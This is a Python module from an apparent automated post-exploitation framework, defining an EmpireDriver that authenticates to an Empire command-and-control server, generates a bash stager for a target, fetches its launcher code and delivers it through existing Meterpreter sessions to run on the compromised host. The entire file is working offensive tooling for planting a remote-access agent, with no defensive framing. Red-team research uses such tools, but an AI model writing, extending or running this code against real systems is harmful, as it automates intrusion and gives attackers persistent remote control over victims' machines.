import requests,time,json,os
from urllib.parse import urljoin
from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult
from modules.drivers.post_exploit.deliviry_driver import DeliveryDriver
from modules.drivers.post_exploit.empire_api import get_empire_token
from modules.core.utils import get_ip
from modules.core.utils import safe_filename

def empire_request(method, url, headers=None, data=None, json=None, verify=False, **kwargs):
    print(f"[EmpireRequest] {method} {url}")
    print(f"[EmpireRequest] Headers: {headers}")
    if data:
        print(f"[EmpireRequest] Data: {data}")
    if json:
        print(f"[EmpireRequest] JSON: {json}")
    try:
        resp = requests.request(method, url, headers=headers, data=data, json=json, verify=verify, timeout=10, **kwargs)
        print(f"[EmpireRequest] Status: {resp.status_code}")
        print(f"[EmpireRequest] Response: {resp.text[:500]}")  # limit log length
        resp.raise_for_status()
        return resp
    except requests.RequestException as e:
        print(f"[EmpireRequest] RequestException: {e}")
        if hasattr(e, 'response') and e.response is not None:
            print(f"[EmpireRequest] Error response body: {e.response.text[:500]}")
        raise
    

def empire_get_listeners(api_url, token):
    """
    Return a list of listener names configured in Empire REST API.

    Handles both possible Empire API formats: a 'records' key, or direct list.
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "accept": "application/json"
    }
    url = urljoin(api_url.rstrip("/") + "/", "listeners/")
    try:
        resp = requests.get(url, headers=headers, timeout=10, verify=False)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"[empire_get_listeners] Request error: {e}")
        return []

    try:
        data = resp.json()
    except Exception as e:
        print(f"[empire_get_listeners] Failed to parse JSON: {e}")
        return []

    listeners = []

    # Empire API v2: listeners may be under 'records', or top-level list.
    if isinstance(data, dict) and "records" in data:
        items = data["records"]
    elif isinstance(data, list):
        items = data
    else:
        items = []

    for item in items:
        if isinstance(item, dict):
            # v2 usually uses 'name'; older may use 'Name'
            name = item.get("name") or item.get("Name")
            if name:
                listeners.append(name)

    return listeners


def empire_delete_stager(api_url, token, stager_name, logger=None):
    headers = {"Authorization": f"Bearer {token}"}
    # Step 1: List all stagers
    url = urljoin(api_url + "/", "stagers")
    resp = requests.get(url, headers=headers, timeout=10, verify=False)
    resp.raise_for_status()
    stager_id = None
    for s in resp.json().get("records", []):
        if s.get("name") == stager_name:
            stager_id = s.get("id")
            break
    if stager_id is None:
        if logger:
            logger.info(f"[EmpireDriver] Stager '{stager_name}' not found, nothing to delete.")
        return True  # Already deleted / does not exist
    # Step 2: Delete by ID
    del_url = urljoin(api_url + "/", f"stagers/{stager_id}")
    del_resp = requests.delete(del_url, headers=headers, timeout=10, verify=False)
    if logger:
        logger.info(f"[EmpireDriver] Delete response status: {del_resp.status_code}")
    return del_resp.status_code in (200, 204, 404)


class EmpireDriver(BaseToolDriver):
    name = "post"
    


    def __init__(self, config, session_mgr, logger):
        super().__init__(config, session_mgr, logger)
        self.api_url = config.get("empire_api_url", "http://127.0.0.1:1337/api/v2").rstrip("/")
        self.host_url = config.get("empire_url", "http://127.0.0.1:1337").rstrip("/")
        self.listener = config.get("empire_listener", "http")
        self.outdir = config.get("empire_output_dir", "results/raw/empire")
        self.delivery_driver = DeliveryDriver(config, session_mgr, logger)
        self.token = config.get("empire_api_token")
        if not self.token:
            self.token = get_empire_token(
                self.host_url,
                config["empire_username"],
                config["empire_password"]
            )
            config["empire_api_token"] = self.token

        # Listener check: verify listener exists in Empire
        try:
            listeners = empire_get_listeners(self.api_url, self.token)
            if self.listener not in listeners:
                logger.error(f"[EmpireDriver] Listener '{self.listener}' does not exist in Empire! Available: {listeners}")
                raise RuntimeError(f"Empire listener '{self.listener}' does not exist.")
        except Exception as e:
            logger.error(f"[EmpireDriver] Could not verify listeners: {e}")
            raise
            
    def run(self, target: str, **kwargs) -> DriverResult:
        sessions = self.config.get("metasploit_sessions", {}).get(get_ip(target), [])
        if not sessions:
            self.logger.warning(f"[EmpireDriver] No Meterpreter session for {target}, skipping Empire stager delivery.")
            return DriverResult(raw_output=None)
        msf_scripts_dir = self.config.get("metasploit_resource_dir", "/dmpp/modules/exploitation/msf_scripts")
        msf_empire_scripts_dir = self.config.get("empire_output_dir", "/dmpp/modules/post_exploit/msf_empire_scripts")

        stager_name = f"autostager_{target.replace('://', '_').replace('/', '_')}"
        headers = {"Authorization": f"Bearer {self.token}"}
        payload = {
            "name": stager_name,
            "options": {
                "Base64": "True",
                "Bypasses": "",
                "Language": "python",
                "Listener": self.listener,
                "Obfuscate": "False",
                "ObfuscateCommand": "",
                "OutFile": "",
                "Proxy": "default",
                "ProxyCreds": "default",
                "SafeChecks": "True",
                "StagerRetries": "0",
                "UserAgent": "default"
            },
            "template": "linux_bash"
        }
        url = urljoin(self.api_url + "/", "stagers/")

        # Delete existing stager before creating a new one
        self.logger.info(f"[EmpireDriver] Checking for existing stager '{stager_name}' to delete.")
        deleted = empire_delete_stager(self.api_url, self.token, stager_name, self.logger)
        if deleted:
            self.logger.info(f"[EmpireDriver] Deleted existing stager '{stager_name}' (if any).")
        else:
            self.logger.error(f"[EmpireDriver] Failed to delete stager '{stager_name}'.")
        time.sleep(1)

        try:
            self.logger.info(f"[EmpireDriver] Requesting stager '{payload['template']}' for listener '{self.listener}'", extra={"target": target})
            self.logger.debug(f"[EmpireDriver] POST payload: {json.dumps(payload)}")
            resp = requests.post(url, headers=headers, json=payload, timeout=30, verify=False)
            self.logger.debug(f"[EmpireDriver] Empire API response: {resp.status_code} {resp.text[:500]}")
            resp.raise_for_status()
        except requests.ConnectionError as ce:
            self.logger.error(f"[EmpireDriver] ConnectionError: {ce}", exc_info=True)
            return DriverResult(raw_output=None)
        except requests.RequestException as e:
            self.logger.error(f"[EmpireDriver] API error: {e}")
            return DriverResult(raw_output=None)
        launcher = None
        # Robust result parsing
        json_resp = resp.json()
        try:
            if "results" in json_resp and isinstance(json_resp["results"], dict):
                launcher = json_resp["results"].get("launcher") or json_resp["results"].get("Launcher")
            if not launcher:
                launcher = json_resp.get("launcher") or json_resp.get("Launcher")
            if not launcher:
                downloads = json_resp.get("downloads") or json_resp.get("Downloads")
                if downloads and isinstance(downloads, list) and downloads and downloads[0].get("link"):
                    download_link = downloads[0]["link"]
                    if download_link.startswith("http"):
                        download_url = download_link
                    else:
                        from urllib.parse import urlparse
                        parsed = urlparse(self.api_url)
                        base = f"{parsed.scheme}://{parsed.netloc}"
                        download_url = base + download_link
                    dl_headers = {"Authorization": f"Bearer {self.token}"}
                    dl_resp = requests.get(download_url, headers=dl_headers, timeout=10, verify=False)
                    dl_resp.raise_for_status()
                    launcher = dl_resp.text

        except Exception as e:
            self.logger.error(f"[EmpireDriver] Exception retrieving stager code: {e}")
            return DriverResult(raw_output=None)

        if not launcher:
            self.logger.error(f"[EmpireDriver] No launcher in stager response, response was: {json_resp}")
            return DriverResult(raw_output=None)



        rc_file = os.path.join(msf_scripts_dir, f"{safe_filename(target)}.rc")
        rc_output_path = os.path.join(msf_empire_scripts_dir, f"{safe_filename(target)}_empire.rc")

        delivery_driver = DeliveryDriver(self.config, self.session_mgr, self.logger)

        result = delivery_driver.run(
            target,
            launcher=launcher,
            rc_file=rc_file,
            rc_output_path=rc_output_path,
        )
        self.logger.info(f"Empire delivery result: {result}")

        # Deploy the stager using the DeliveryDriver
        delivery_result = self.delivery_driver.run(target, launcher=launcher)
        # Detailed verification/logging of delivery result
        if not delivery_result or getattr(delivery_result, 'raw_output', None) is None:
            self.logger.error(f"[EmpireDriver] Failed to deploy stager, delivery result: {delivery_result}")
            return DriverResult(raw_output=None)
        self.logger.info(f"[EmpireDriver] Stager delivered and executed, result: {delivery_result.raw_output}")

        return DriverResult(raw_output="Stager deployed successfully")

    def parse(self, raw_output_path: str) -> ParsedResult:
        return ParsedResult(data={"status": "Stager deployed"})
